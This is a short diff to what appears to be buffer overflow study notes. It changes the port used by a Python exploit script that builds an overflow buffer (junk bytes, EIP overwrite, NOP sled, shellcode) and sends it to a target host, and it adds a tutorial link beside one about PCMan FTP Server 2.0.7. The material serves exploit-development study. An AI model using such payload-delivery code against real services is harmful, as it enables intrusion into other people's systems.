@@ -24,7 +24,7 @@ other = '\x42' * (buffer_size - pattern_ofset - eip - nops - len(shellcode))
 buffer = junk + eip + nops + shellcode + other
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((sys.argv[1], 4455))
+s.connect((sys.argv[1], 1234))
 s.send(buffer)
 s.recv(1024)
 s.close()
@@ -231,3 +231,4 @@ Link
 ===
 
 https://gurelahmet.com/stack-tabanl%C4%B1-buffer-overflow-zafiyeti-pcman-ftp-server-2-0-7/
+https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood_tutorial.pdf
